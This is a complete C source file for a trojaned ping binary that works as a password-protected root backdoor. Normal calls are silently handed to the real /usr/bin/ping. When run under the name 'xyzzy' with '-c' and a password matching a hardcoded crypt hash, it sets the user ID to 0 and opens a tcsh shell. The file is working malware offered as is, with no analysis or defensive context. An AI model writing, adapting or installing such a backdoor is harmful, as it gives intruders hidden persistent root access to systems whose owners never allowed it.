/* pass.c */

#include <pwd.h>
#include <stdio.h>
#include <termios.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define CRYPT "pdlELWSmvhs8s"
#define ROOT_FLAG "-c"
#define BIN_NAME "xyzzy"
#define TRUE 0
#define FALSE 1
#define PING_BINARY "/usr/bin/ping"

#define BOOLEAN short int

BOOLEAN pass();

main(argc,argv)
int argc;
char *argv[];
{
  if ( strcmp(BIN_NAME,argv[0]) == 0 )
    {
      if ( (argc == 2) && (strcmp(ROOT_FLAG,argv[1]) == 0) )
	{
	  if (pass() == TRUE)
	    {
	      printf("poof\n");
	      suid();
	    }
	  else
	    printf("Permission denied\n");
	}
      else
	printf("Nothing happens.\n");
    }  
  else
    {
      execv(PING_BINARY, argv);
      exit(1);
    }
  exit(0);
}

/* ---------- suid() ---------- */

suid()
{
  setuid(0);
  execl("/bin/tcsh", " tcsh", NULL);
  exit(1);
}

/* ---------- pass() ---------- */

BOOLEAN pass()
{
  char buff[20];
  char password[20];
  struct termios attr;

/*  printf("Password:  "); */
  fflush(stdout);

  tcgetattr(STDIN_FILENO, &attr);
  attr.c_lflag &= ~ECHO;
  tcsetattr(STDIN_FILENO, TCSAFLUSH, &attr);

  fgets(buff, sizeof(buff), stdin);
  sscanf(buff, "%s", password);

  attr.c_lflag |= ECHO;
  tcsetattr(STDIN_FILENO, TCSAFLUSH, &attr);
  printf("\n");

  return (short int)strcmp(CRYPT, crypt(password, CRYPT));
}








